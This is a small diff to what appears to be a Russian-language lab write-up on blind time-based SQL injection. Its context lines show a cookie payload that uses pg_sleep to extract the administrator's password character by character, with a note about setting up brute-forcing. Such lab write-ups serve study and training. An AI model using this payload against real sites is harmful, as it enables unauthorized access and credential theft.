@@ -41,6 +41,7 @@ Cookie: TrackingId=XJiQEzhDY6BBK3sr' || (SELECT CASE WHEN (username='administrat
 Определяем сам пароль:
 ```sql
 Cookie: TrackingId=XJiQEzhDY6BBK3sr' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM USERS)--
+```
 
 В рамках брутфорса необходимо создать настройку:
 
